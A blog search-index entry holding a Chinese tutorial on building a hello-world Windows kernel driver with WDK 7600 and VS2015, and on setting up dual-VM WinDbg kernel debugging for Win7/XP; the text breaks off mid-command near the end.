<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>windows_xp_win7驱动编译调试环境搭建</title>
    <link href="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Windows-xp-win7-驱动编译与双虚拟机调试环境搭建"><a href="#Windows-xp-win7-驱动编译与双虚拟机调试环境搭建" class="headerlink" title="Windows_xp_win7-驱动编译与双虚拟机调试环境搭建"></a>Windows_xp_win7-驱动编译与双虚拟机调试环境搭建</h1><h2 id="一-简述"><a href="#一-简述" class="headerlink" title="一.简述"></a>一.简述</h2><ul><li>因最近需要编写一些xp与win7上的驱动程序，但是网上搜索环境配置要不就很老旧，要不很繁琐，最好还是能双虚拟机调试，在网上没有找到能完全满足需求的，就整合网上的一些资源编写此文档。</li><li>主要内容为使用vmware 双win7虚拟机调试、win7安装vs2015、使用驱动模板编译win7与xp驱动</li></ul><h2 id="二-环境介绍"><a href="#二-环境介绍" class="headerlink" title="二.环境介绍"></a>二.环境介绍</h2><table><thead><tr><th>应用名称</th><th>版本</th><th>备注</th></tr></thead><tbody><tr><td>windows7 x64 调试机</td><td>windows7 x64 sp1</td><td>cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso</td></tr><tr><td>windows7 x64 被调试机</td><td>windows7 x64 sp1</td><td>cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso</td></tr><tr><td>WDK 7600</td><td>7600.16385.1</td><td><a href="https://www.microsoft.com/en-us/download/details.aspx?id=11800">https://www.microsoft.com/en-us/download/details.aspx?id=11800</a></td></tr><tr><td>VS 2015</td><td>Visual Studio <em>2015</em> Community</td><td></td></tr><tr><td>ie 11</td><td>ie 11</td><td><a href="https://support.microsoft.com/zh-cn/windows/%E4%B8%8B%E8%BD%BD-internet-explorer-11-%E8%84%B1%E6%9C%BA%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F-99d492a1-3a62-077b-c476-cf028aff9a7f"><strong>https://support.microsoft.com/zh-cn/windows/%E4%B8%8B%E8%BD%BD-internet-explorer-11-%E8%84%B1%E6%9C%BA%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F-99d492a1-3a62-077b-c476-cf028aff9a7f</strong></a></td></tr><tr><td>wingdb</td><td>6.12</td><td>调试工具</td></tr><tr><td>vmware workstation</td><td>vmware workstation 17 pro</td><td></td></tr><tr><td>SRVINSTW.EXE</td><td>SRVINSTW.EXE</td><td>安装驱动程序</td></tr><tr><td>dbgview64.exe</td><td>dbgview64.exe</td><td>查看驱动打印</td></tr><tr><td>vs2013驱动开发模板</td><td>驱动配置模板</td><td><a href="https://bbs.kanxue.com/thread-188471.htm">https://bbs.kanxue.com/thread-188471.htm</a></td></tr><tr><td>Everything</td><td>Everything-1.4.1.935.x86-Setup</td><td></td></tr><tr><td>64Signer</td><td>64Signer</td><td>签名工具</td></tr></tbody></table><ul><li><p>win7 虚拟机不能安装vm tools</p><ul><li><a href="https://catalog.update.microsoft.com/Search.aspx?q=kb4474419">https://catalog.update.microsoft.com/Search.aspx?q=kb4474419</a></li></ul></li><li><p>vs2015支持模板导出，也可以选择制作自己的模板</p></li></ul><h2 id="三-安装测试wdk7600"><a href="#三-安装测试wdk7600" class="headerlink" title="三.安装测试wdk7600"></a>三.安装测试wdk7600</h2><h3 id="3-1-安装wdk7600"><a href="#3-1-安装wdk7600" class="headerlink" title="3.1.安装wdk7600"></a>3.1.安装wdk7600</h3><ul><li>下载<code>WDK 7600</code>并解压执行</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225215103102.png" class="" title="png"><ul><li>勾选全部选项并点击ok</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225215131580.png" class="" title="png"><ul><li>选择路径，我这直接点击ok</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225215218962.png" class="" title="png"><ul><li>点击<code>Finish</code>完成安装</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225215604598.png" class="" title="png"><h3 id="3-2-使用wdk7600编译驱动程序"><a href="#3-2-使用wdk7600编译驱动程序" class="headerlink" title="3.2.使用wdk7600编译驱动程序"></a>3.2.使用wdk7600编译驱动程序</h3><h4 id="3-2-1-驱动代码"><a href="#3-2-1-驱动代码" class="headerlink" title="3.2.1.驱动代码"></a>3.2.1.驱动代码</h4><ul><li><p>创建<code>first</code>目录，在此目录中创建三个文件</p></li><li><p>first.c</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntddk.h&gt;</span></span><br><br><span class="hljs-function">VOID <span class="hljs-title">DriverUnload</span><span class="hljs-params">(PDRIVER_OBJECT driver)</span></span>&#123;<br>     <span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;first:Our driver is unloading\r\n&quot;</span>);<br> &#125;<br> <span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path)</span></span>&#123;<br>     <br>     <span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;first:Our hello my salary\r\n&quot;</span>);<br>     <br>     driver-&gt;DriverUnload=DriverUnload;<br>     <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>makefile</li></ul><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">!IF <span class="hljs-number">0</span><br>Module Name:<br>makefile .<br>Notes:<br>DO NOT EDIT THIS FILE!!!<br>!ENDIF<br>!INCLUDE $(NTMAKEENV)\makefile.def<br></code></pre></td></tr></table></figure><ul><li>SOURCES</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">TARGETNAME</span><span class="hljs-operator">=</span>first<br><span class="hljs-attribute">TARGETTYPE</span><span class="hljs-operator">=</span>DRIVER<br><span class="hljs-attribute">SOURCES</span><span class="hljs-operator">=</span>first.c<br></code></pre></td></tr></table></figure><ul><li><p>TARGETNAME表示名字，编译出来之后模块的名字first.sys</p></li><li><p>SOURCES表示要编译的.c文件</p></li><li><ul><li>不要加入.h文件，.h是被包含在.c文件中编译的</li></ul></li></ul><h4 id="3-2-2-编译"><a href="#3-2-2-编译" class="headerlink" title="3.2.2.编译"></a>3.2.2.编译</h4><ul><li>开始菜单中，选择 所有程序 ,然后选择 <code>Windows Driver Kits</code>  -&gt; <code>WDK版本</code> -&gt;   <code>Build Environments</code>  -&gt;  <code>Windows 7</code>  -&gt;   <code>x64 Checked Build Environment</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225220248934.png" class="" title="png"><ul><li>进入 first 目录执行 build 命令</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225220640605.png" class="" title="png"><ul><li>编译结束， first.sys 出现在 <code>C:\Users\test\Desktop\first\objchk_win7_amd64\amd64</code> 目录下</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225220717940.png" class="" title="png"><h3 id="3-3-测试驱动程序"><a href="#3-3-测试驱动程序" class="headerlink" title="3.3.测试驱动程序"></a>3.3.测试驱动程序</h3><h4 id="3-3-1-安装驱动程序"><a href="#3-3-1-安装驱动程序" class="headerlink" title="3.3.1.安装驱动程序"></a>3.3.1.安装驱动程序</h4><ul><li>在一台新安装的<code>win7 x64 sp1</code>虚拟机上执行，在开机时按下<code>f8</code>，禁用驱动签名，将生成的<code>first.sys</code>拷贝到此虚拟机</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221105405.png" class="" title="png"><ul><li>使用管理员权限打开<code>SRVINSTW.EXE</code>，<code>安装服务</code>点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221449033.png" class="" title="png"><ul><li><code>本地机器</code>点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221533209.png" class="" title="png"><ul><li>服务名称填写<code>first</code>然后点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221603524.png" class="" title="png"><ul><li>根据<code>first.sys</code>所在路径填写，文件位置</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221656680.png" class="" title="png"><ul><li>选择<code>设备驱动</code>，点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221749610.png" class="" title="png"><ul><li>默认点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221802026.png" class="" title="png"><ul><li>选择<code>手动</code>，点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221823143.png" class="" title="png"><ul><li>点击<code>完成</code>，弹出服务成功安装</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225221857378.png" class="" title="png"><h4 id="3-3-2-执行驱动程序"><a href="#3-3-2-执行驱动程序" class="headerlink" title="3.3.2.执行驱动程序"></a>3.3.2.执行驱动程序</h4><ul><li>管理器权限执行<code>dbgview64.exe</code>，在菜单栏点击<code>capture</code>，然后全部勾选</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225222132047.png" class="" title="png"><ul><li>管理员启动<code>cmd</code>，执行<code>net start first</code>,可以看到<code>dbgview64.exe</code>,有打印输出与，上述驱动代码相同</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225222324785.png" class="" title="png"><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">net <span class="hljs-built_in">start</span> <span class="hljs-keyword">first</span> \\启动驱动<br>net <span class="hljs-built_in">stop</span> <span class="hljs-keyword">first</span>\\停止驱动<br>sc <span class="hljs-built_in">delete</span> <span class="hljs-keyword">first</span> \\卸载驱动<br></code></pre></td></tr></table></figure><ul><li>如上面所示<code>wdk7600</code>安装成功</li></ul><h2 id="四-安装vs2015"><a href="#四-安装vs2015" class="headerlink" title="四.安装vs2015"></a>四.安装vs2015</h2><h3 id="4-1-安装IE11"><a href="#4-1-安装IE11" class="headerlink" title="4.1.安装IE11"></a>4.1.安装IE11</h3><ul><li>因为vs2015要求安装<code>ie 10</code>以上版本，这里安装<code>ie11</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225223552141.png" class="" title="png"><ul><li><p>可能有下列情况，先尝试直接安装，直接安装不成功或者看报错信息在选择执行情况1或情况2</p></li><li><p>情况1：有可能安装<code>IE11</code>需要补丁，补丁链接如下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">32</span>位<br><br><span class="hljs-symbol">http:</span>//www.microsoft.com/<span class="hljs-built_in">zh</span>-cn/download/internet-explorer.aspx<br><br><span class="hljs-number">64</span>位<br><br><span class="hljs-symbol">http:</span>//www.microsoft.com/<span class="hljs-built_in">zh</span>-cn/download/details.aspx?id=<span class="hljs-number">45154</span><br></code></pre></td></tr></table></figure></li><li><p>情况2安装证书：</p></li><li><p>在win10系统上Windows键+R 弹出<code>运行</code>对话框，输入<code>certmgr.msc</code>，打开Windows的证书管理器</p></li><li><p>导出如下证书安装在win7系统上</p></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.Microsoft</span> Root Certificate Authority <span class="hljs-number">2010</span>；<br><br><span class="hljs-number">2</span><span class="hljs-selector-class">.Microsoft</span> Root Certificate Authority <span class="hljs-number">2011</span>；<br><br><span class="hljs-number">3</span><span class="hljs-selector-class">.COMODO</span> RSA Certification Authority；<br><br></code></pre></td></tr></table></figure><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225224355149.png" class="" title="png"><ul><li>将上面三个证书拷贝到<code>win7</code>系统然后安装上去</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225224604565.png" class="" title="png"><h3 id="4-2-安装vs2015"><a href="#4-2-安装vs2015" class="headerlink" title="4.2.安装vs2015"></a>4.2.安装vs2015</h3><ul><li>运行<code>vs2015</code>安装程序，这里我选择自定义</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225230137520.png" class="" title="png"><ul><li>只选择<code>c++</code>然后点击下一步</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225230849872.png" class="" title="png"><ul><li>点击安装</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225230904010.png" class="" title="png"><ul><li>等待安装成功即可</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241225230924485.png" class="" title="png"><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226012901806.png" class="" title="png"><h2 id="五-配置vs2015编译驱动"><a href="#五-配置vs2015编译驱动" class="headerlink" title="五.配置vs2015编译驱动"></a>五.配置vs2015编译驱动</h2><ul><li>这里是使用模板的方式进行的配置编译驱动，这里直接使用网上大佬放出来的模板，也可以自己进行配置然后导出是一样的，但是会很耗费时间与精力</li></ul><h3 id="5-1-配置环境变量"><a href="#5-1-配置环境变量" class="headerlink" title="5.1.配置环境变量"></a>5.1.配置环境变量</h3><ul><li>新建<code>WDKPATH</code>,并添加wdk路径</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226013221782.png" class="" title="png"><h3 id="5-2-设置模板"><a href="#5-2-设置模板" class="headerlink" title="5.2.设置模板"></a>5.2.设置模板</h3><ul><li>安装<code>Everything</code>,搜索<code>ProjectTemplates</code>目录</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226013706476.png" class="" title="png"><ul><li>进入<code>ProjectTemplates</code>,将下载好的模板拷贝过去，然后重启系统</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226013858698.png" class="" title="png"><h3 id="5-3-编译驱动程序"><a href="#5-3-编译驱动程序" class="headerlink" title="5.3.编译驱动程序"></a>5.3.编译驱动程序</h3><ul><li>打开<code>vs2015</code>创建新项目，点击<code>c++</code>，可以发现出现了<code>Windows Driver1</code></li><li>创建<code>Windows Driver1</code>项目，名称填写<code>first2</code>,将一开始编写的驱动代码拷贝过去</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226014549378.png" class="" title="png"><ul><li>如下图所示使用此项目可以编译多种系统的驱动,<code>Checked</code>为调试，<code>free</code>为re版</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226014635805.png" class="" title="png"><ul><li>并且可以选择<code>x64</code>和<code>x86</code>，需要注意无法编译<code>xp</code>下的<code>x64</code>的驱动程序</li><li>需要注意这是使用<code>vs2013</code>的模板，需要将项目属性改为<code>v140</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015050873.png" class="" title="png"><ul><li><code>生成</code>-&gt;<code>重新生成解决方案</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015146035.png" class="" title="png"><h3 id="5-4-更改模板"><a href="#5-4-更改模板" class="headerlink" title="5.4.更改模板"></a>5.4.更改模板</h3><ul><li>1.更改上面的<code>平台工具集</code></li><li>2.在属性面板，可以看到<code>全程序优化</code>（无全程序优化）</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015445158.png" class="" title="png"><ul><li>3.更改到<code>re</code>版，可以看到<code>使用链接时间代码生成</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015510577.png" class="" title="png"><ul><li>在属性页，点击<code>链接器</code>-&gt;<code>优化</code>-&gt;<code>使用快速链接时间代码生成 (/LTCG:incremental)</code>,这样编译会报错</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015805570.png" class="" title="png"><ul><li>需要改成<code>使用链接时间代码生成 (/LTCG)</code>,即可完成编译</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226015838787.png" class="" title="png"><ul><li>自己也可以制作成模板，就不需要每次编写驱动，进行配置vs</li></ul><h2 id="六-双虚拟机调试驱动"><a href="#六-双虚拟机调试驱动" class="headerlink" title="六.双虚拟机调试驱动"></a>六.双虚拟机调试驱动</h2><ul><li>本文中的调试机与被调试机都为<code>win7 x64 sp1</code></li></ul><h3 id="6-1-配置调试机"><a href="#6-1-配置调试机" class="headerlink" title="6.1.配置调试机"></a>6.1.配置调试机</h3><ul><li>该端是<a href="https://cloud.tencent.com/product/cvm/?from_column=20065&from=20065">服务器</a> ，另一端是虚拟机</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226185952446.png" class="" title="png"><ul><li>打开windbg左上角的 File然后点击Kernel Debug 然后再点击 COM ，设置如下图所示 ，然后点击确定</li><li>安装的wdk7600中就带有<code>windbg</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226190145008.png" class="" title="png"><ul><li>选择com，然后点击确认，设置如下图所示</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226190155635.png" class="" title="png"><ul><li>点击确定后的画面如下图所示，然后重启Win 7 在 Win 7 虚拟机那边选择启用调试程序</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226190259580.png" class="" title="png"><h3 id="6-2-配置被调试机"><a href="#6-2-配置被调试机" class="headerlink" title="6.2.配置被调试机"></a>6.2.配置被调试机</h3><ul><li>虚拟机的串行端口设置如下（该端是客户端 ，另一端是虚拟机 ），命名管道设置为 <a href="file://./pipe/com_1">\.\pipe\com_1</a></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226185716228.png" class="" title="png"><ul><li>以管理员身份运行cmd执行<code>bcdedit</code> ,一般只有一个标识为{current}的启动加载器是当前的启动配置</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226185803686.png" class="" title="png"><ul><li>使用如下命令建立一个新的启动项，并且使用bcdedit检查是否copy成功</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bcdedit /copy &#123;current&#125; /d <span class="hljs-string">&quot;Windwos7&quot;</span><br></code></pre></td></tr></table></figure><ul><li>设置新的启动项</li></ul> <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">bcdedit /<span class="hljs-keyword">debug</span> <span class="hljs-keyword">ON</span><br>bcdedit /bootdebug <span class="hljs-keyword">ON</span><br></code></pre></td></tr></table></figure><ul><li>查看当前的调试配置<code>bcdedit /dbgsettings</code>,一般会显示出使用的第一个串口波特率为115200bps</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226185917154.png" class="" title="png"><ul><li>选择菜单的超时，我设置为15秒：  bcdedit &#x2F;timeout 15 </li><li>重新启动，当需要调试时就用调试模式进入</li></ul><h3 id="6-3-驱动调试准备"><a href="#6-3-驱动调试准备" class="headerlink" title="6.3.驱动调试准备"></a>6.3.驱动调试准备</h3><h4 id="6-3-1-断点"><a href="#6-3-1-断点" class="headerlink" title="6.3.1.断点"></a>6.3.1.断点</h4><ul><li><p>32位支持内联asm汇编</p></li><li><p>64位利用在Source文件中直接添加asm文件，直接在asm文件中写汇编代码，然后将asm文件编译为OBJ文件。然后就可以在c++文件中声明asm文件中的函数后直接使用asm文件中用汇编写的函数</p></li><li><p>64位也可使用 DbgBreakPoint(); </p><ul><li>本文使用此方法</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntddk.h&gt;</span></span><br><span class="hljs-function">VOID <span class="hljs-title">DriverUnload</span><span class="hljs-params">(PDRIVER_OBJECT driver)</span> </span>&#123;<br><span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;first:Our driver is unloading\r\n&quot;</span>);<br>&#125;<br><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span> </span>&#123;<br><span class="hljs-built_in">DbgBreakPoint</span>();<br><span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;first:Our hello my salary\r\n&quot;</span>);<br><br>driver-&gt;DriverUnload = DriverUnload;<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="6-3-2-签名"><a href="#6-3-2-签名" class="headerlink" title="6.3.2.签名"></a>6.3.2.签名</h4><ul><li>win7 x64安装驱动需要签名，这里使用<code>64Signer</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226192152329.png" class="" title="png"><h4 id="6-3-3-调试符号下载与配置"><a href="#6-3-3-调试符号下载与配置" class="headerlink" title="6.3.3.调试符号下载与配置"></a>6.3.3.调试符号下载与配置</h4><ul><li>使用windbg自动下载符号很慢，所以使用windbg目录中存在 symchk.exe 程序，使用如下命令可进行下载</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"> symchk.exe /r c:\windows\system32\ /s SRV*C:\Users\<span 